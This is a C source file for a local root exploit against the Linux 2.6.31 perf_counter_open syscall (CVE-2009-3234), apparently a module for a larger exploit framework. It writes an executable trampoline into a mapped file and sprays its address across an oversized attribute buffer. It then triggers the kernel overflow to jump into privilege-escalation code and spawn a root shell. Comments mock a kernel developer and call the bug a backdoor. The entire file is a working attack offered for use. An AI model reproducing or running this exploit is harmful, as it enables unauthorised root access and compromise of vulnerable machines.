/* Ingo m0wnar */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "exp_framework.h"

#undef __NR_perf_counter_open
#ifdef __x86_64__
#define __NR_perf_counter_open 298
//#define OFFSET_OF_IP 0x88
#define BUF_SIZE 0x100
#else
#define __NR_perf_counter_open 336
//#define OFFSET_OF_IP 0x5c
#define BUF_SIZE 0x80
#endif

struct perf_counter_attr {
	unsigned int type;
	unsigned int size;
};

struct exploit_state *exp_state;

char *desc = "Ingo m0wnar: Linux 2.6.31 perf_counter local root (Ingo backdoor method)";
char *cve = "CVE-2009-3234";

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

int requires_null_page = 0;


static char *dirty_code;

int prepare(unsigned char *ptr)
{
	char *mem;
	int fd;

	fd = open("./suckit_selinux", O_CREAT | O_WRONLY, 0644);
	if (fd < 0) {
		printf("unable to create file\n");
		exit(1);
	}

	mem = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mem == MAP_FAILED) {
		printf("unable to mmap\n");
		unlink("./suckit_selinux");
		exit(1);
	}
        mem[0] = '\xff';
        mem[1] = '\x15';
        *(unsigned int *)&mem[2] = (sizeof(unsigned long) != sizeof(unsigned int)) ? 6 : (unsigned int)mem + 12;
        mem[6] = '\xff';
        mem[7] = '\x25';
        *(unsigned int *)&mem[8] = (sizeof(unsigned long) != sizeof(unsigned int)) ? sizeof(unsigned long) : (unsigned int)mem + 16;
        *(unsigned long *)&mem[12] = (unsigned long)exp_state->own_the_kernel;
        *(unsigned long *)&mem[12 + sizeof(unsigned long)] = (unsigned long)exp_state->exit_kernel;
	write(fd, mem, 0x1000);
	close(fd);
	munmap(mem, 0x1000);

	fd = open("./suckit_selinux", O_RDONLY);
	if (fd < 0) {
		printf("unable to open file for reading\n");
		unlink("./suckit_selinux");
		exit(1);
	}
	dirty_code = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0);
	if (dirty_code == MAP_FAILED) {
		printf("unable to mmap\n");
		exit(1);
	}

	unlink("./suckit_selinux");

	return 0;
}

int trigger(void)
{
	struct perf_counter_attr *ctr;
	int tid;
	int i;

	ctr = (struct perf_counter_attr *)calloc(1, 0x1000);
	if (ctr == NULL) {
		fprintf(stdout, "out of memory\n");
		exit(1);
	}

	/* Ingo's 3 line backdoor, reminds me of wait4() */
	//ctr->size = BUF_SIZE;
	//*(unsigned long *)((char *)ctr + OFFSET_OF_IP) = (unsigned long)dirty_code;
	//syscall(__NR_perf_counter_open, ctr, getpid(), 0, 0, 0UL);

	/* just in case it gets compiled differently... ;) */
	ctr->size = BUF_SIZE;
	for (i = 0x40; i < BUF_SIZE; i+= sizeof(unsigned long)) {
		if (!(i % (sizeof(unsigned long) * sizeof(unsigned long))))
			continue;
		*(unsigned long *)((char *)ctr + i) = (unsigned long)dirty_code;
	}

	syscall(__NR_perf_counter_open, ctr, getpid(), 0, 0, 0UL);

	/* if we're successful, we won't get to this next line */

	fprintf(stdout, "System is not vulnerable.\n");
	exit(1);

	return 0;
}

int post(void)
{
	return RUN_ROOTSHELL;
}
